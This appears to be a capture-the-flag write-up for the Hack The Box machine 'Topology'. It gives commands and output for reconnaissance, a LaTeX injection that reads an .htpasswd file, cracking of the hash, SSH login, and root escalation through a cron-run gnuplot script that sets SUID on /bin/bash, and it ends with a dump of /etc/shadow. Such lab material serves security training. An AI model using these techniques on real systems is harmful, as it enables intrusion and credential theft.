---
layout: post
title: HTB{Topology}
author: mr4ndr3w
tags: [write-up, hackthebox, machine, linux,]
---
<!--cut-->
### USER:

Scan [IP]:

`nmap -sC -sV -A [IP]`

```text
┌──(kali㉿kali)-[~/htb/machines/Topology]
└─$ nmap -sC -sV -A 10.10.11.217
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 12:43 EDT
Nmap scan report for latex.topology.htb (10.10.11.217)
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE  TIME              FILENAME
| -     2023-01-17 12:26  demo/
| 1.0K  2023-01-17 12:26  demo/fraction.png
| 1.1K  2023-01-17 12:26  demo/greek.png
| 1.1K  2023-01-17 12:26  demo/sqrt.png
| 1.0K  2023-01-17 12:26  demo/summ.png
| 3.8K  2023-06-12 07:37  equation.php
| 662   2023-01-17 12:26  equationtest.aux
| 17K   2023-01-17 12:26  equationtest.log
| 0     2023-01-17 12:26  equationtest.out
| 28K   2023-01-17 12:26  equationtest.pdf
|_
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Open port 80/View Page Source:

```text
<p>• <a href="http://latex.topology.htb/equation.php">LaTeX Equation Generator</a> - create .PNGs of LaTeX

```

Subdomain scan using `ffuf`:

```text
┌──(kali㉿kali)-[~/htb/machines/Topology]
└─$ ffuf -H "Host: FUZZ.topology.htb" -u http://topology.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 6767

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://topology.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.topology.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 6767
________________________________________________

[Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 2705ms]
    * FUZZ: stats

[Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 2854ms]
    * FUZZ: dev

[Status: 200, Size: 2828, Words: 171, Lines: 26, Duration: 3204ms]
    * FUZZ: latex

[WARN] Caught keyboard interrupt (Ctrl-C)

```

Edit `/etc/hosts` file:


```text
127.0.0.1	localhost
127.0.1.1	kali
10.10.11.217    latex.topology.htb dev.topology.htb topology.htb
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters
```

Latex Injection:


```text
GET /equation.php?eqn=$\lstinputlisting{/var/www/dev/.htpasswd}$&submit= HTTP/1.1
Host: latex.topology.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

```


File `.htpasswd` output:

```text
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO
```

Decrypt hash using `hashcat`:

```text
┌──(kali㉿kali)-[~/htb/machines/Topology]
└─$ hashcat -m 1600 -a 0 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-penryn-12th Gen Intel(R) Core(TM) i7-1255U, 2921/5906 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20          
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
Time.Started.....: Tue Sep 12 13:51:49 2023 (1 min, 16 secs)
Time.Estimated...: Tue Sep 12 13:53:05 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    12797 H/s (8.70ms) @ Accel:32 Loops:1000 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 997440/14344385 (6.95%)
Rejected.........: 0/997440 (0.00%)
Restore.Point....: 997248/14344385 (6.95%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidate.Engine.: Device Generator
Candidates.#1....: cale1089 -> cait2008
Hardware.Mon.#1..: Util: 43%

Started: Tue Sep 12 13:50:59 2023
Stopped: Tue Sep 12 13:53:06 2023
                                          
```

Connect with ssh `vdaisley` with password: `calculus20`.

```text
┌──(kali㉿kali)-[~/htb/machines/Topology]
└─$ ssh vdaisley@10.10.11.217                                          
The authenticity of host '10.10.11.217 (10.10.11.217)' can't be established.
ED25519 key fingerprint is SHA256:F9cjnqv7HiOrntVKpXYGmE9oEaCfHm5pjfgayE/0OK0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.217' (ED25519) to the list of known hosts.
vdaisley@10.10.11.217's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Sep 12 07:27:10 2023 from 10.10.14.21
vdaisley@topology:~$ cat user.txt 
e8f2625ddeefbacd03a7383b09ff5cf3
vdaisley@topology:~$ 
```
### ROOT:


Copy and run `pspy64` tool:


```text
┌──(kali㉿kali)-[~/htb/machines/Topology]
└─$ scp ~/Downloads/Tools/pspy64 vdaisley@10.10.11.217:~/   
vdaisley@10.10.11.217's password: 
pspy64          100% 3032KB   2.1MB/s   00:01    
```


```text
vdaisley@topology:~$ chmod +x pspy64 
vdaisley@topology:~$ ./pspy64 
...
2023/09/12 14:09:00 CMD: UID=0     PID=26276  | 
2023/09/12 14:09:01 CMD: UID=0     PID=26282  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \; 
2023/09/12 14:09:01 CMD: UID=0     PID=26281  | /usr/sbin/CRON -f 
2023/09/12 14:09:01 CMD: UID=0     PID=26280  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \; 
...
```

Achieve privelage escalation by writing a gnuplot script that modifies `/bin/bash` to give us root.


```text
vdaisley@topology:~$ echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/root.plt
vdaisley@topology:~$ /bin/bash -p
bash-5.0# pwd
/home/vdaisley
bash-5.0# cd /root
bash-5.0# ls
root.txt
bash-5.0# cat root.txt 
36c39d7a59de7a35aee67245247aea49 
bash-5.0# cat /etc/shadow
root:$6$P153wNg6DwlTSIv0$QFutCIjQWlJM24O6vyD5aoRv7kyvivOykonMDItV8rSqKpznqsmxfK7L51il6V7yF75qHE.Hkv6YLK25TSEle1:19496:0:99999:7:::
daemon:*:18474:0:99999:7:::
bin:*:18474:0:99999:7:::
sys:*:18474:0:99999:7:::
sync:*:18474:0:99999:7:::
games:*:18474:0:99999:7:::
man:*:18474:0:99999:7:::
lp:*:18474:0:99999:7:::
mail:*:18474:0:99999:7:::
news:*:18474:0:99999:7:::
uucp:*:18474:0:99999:7:::
proxy:*:18474:0:99999:7:::
www-data:*:18474:0:99999:7:::
backup:*:18474:0:99999:7:::
list:*:18474:0:99999:7:::
irc:*:18474:0:99999:7:::
gnats:*:18474:0:99999:7:::
nobody:*:18474:0:99999:7:::
systemd-network:*:18474:0:99999:7:::
systemd-resolve:*:18474:0:99999:7:::
systemd-timesync:*:18474:0:99999:7:::
messagebus:*:18474:0:99999:7:::
syslog:*:18474:0:99999:7:::
_apt:*:18474:0:99999:7:::
mysql:!:18859:0:99999:7:::
tss:*:18859:0:99999:7:::
uuidd:*:18859:0:99999:7:::
sshd:*:18859:0:99999:7:::
pollinate:*:18859:0:99999:7:::
systemd-coredump:!!:18859::::::
vdaisley:$6$gRnKXcAaVVjMGjaY$PuuHK2.WUsdjSd/0ife.Arm05hBBZSZUNTGBrojnvRS4zrvV3prcBac4nOH0Id.7bArqL7QtqAAICTs0fQ2Al0:19063:0:99999:7:::
rtkit:*:19230:0:99999:7:::
dnsmasq:*:19230:0:99999:7:::
cups-pk-helper:*:19230:0:99999:7:::
usbmux:*:19230:0:99999:7:::
avahi:*:19230:0:99999:7:::
geoclue:*:19230:0:99999:7:::
saned:*:19230:0:99999:7:::
colord:*:19230:0:99999:7:::
pulse:*:19230:0:99999:7:::
gdm:*:19230:0:99999:7:::
fwupd-refresh:*:19375:0:99999:7:::
_laurel:!:19496::::::
bash-5.0# 

```


